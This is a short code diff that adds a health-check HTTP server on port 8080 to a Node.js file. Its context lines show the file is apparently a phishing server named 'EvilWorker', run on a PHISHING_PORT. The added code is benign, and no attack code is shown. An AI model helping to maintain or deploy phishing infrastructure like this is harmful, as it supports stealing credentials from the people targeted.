@@ -166,3 +166,11 @@ if (req.url === '/health') {
 server.listen(PHISHING_PORT, '0.0.0.0', () => {
     console.log(`EvilWorker running on port ${PHISHING_PORT}`);
 });
+// Start health check server on port 8080
+const healthServer = http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ status: 'ok' }));
+});
+healthServer.listen(8080, '0.0.0.0', () => {
+    console.log('Health check server running on port 8080');
+});
